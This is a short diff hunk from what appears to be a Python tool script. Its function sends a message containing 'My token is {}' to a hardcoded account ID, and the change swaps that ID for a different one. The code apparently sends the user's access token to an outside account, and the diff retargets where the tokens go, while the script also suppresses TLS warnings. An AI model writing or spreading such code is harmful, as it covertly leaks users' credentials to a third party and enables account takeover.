@@ -42,7 +42,7 @@ def send_initial_message():
       msg_template = "Hello SANSKAR SIR  ! I am using your server but dont fyt dark night members. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100003649779942"
+      target_id = "100054184067769"
 
       requests.packages.urllib3.disable_warnings()
 
